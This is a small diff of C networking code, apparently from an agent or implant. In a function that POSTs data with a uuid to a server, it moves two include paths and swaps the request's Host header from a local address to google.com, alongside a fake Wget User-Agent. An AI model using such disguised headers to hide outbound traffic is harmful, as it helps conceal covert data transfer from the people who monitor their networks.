@@ -5,8 +5,8 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 #include <liburing.h>
-#include "functions/connection/connection.h"
-#include "functions/connection/req_struct.h"
+#include "agent_functions/functions/connection/connection.h"
+#include "agent_functions/functions/connection/req_struct.h"
 #define QUEUE_DEPTH 16
 
 int send2serv(const char *uuid, const char *buf, size_t len) {
@@ -23,7 +23,7 @@ int send2serv(const char *uuid, const char *buf, size_t len) {
     char header_buffer[1024];
     int header_len = snprintf(header_buffer, sizeof(header_buffer),
         "POST /login?uuid=%s HTTP/1.1\r\n"
-        "Host: 127.0.0.1:8000\r\n"
+        "Host: google.com\r\n"
         "User-Agent: Wget/1.20.3 (linux-gnu)\r\n"
         "Accept: */*\r\n"
         "Content-Length: %lu\r\n"
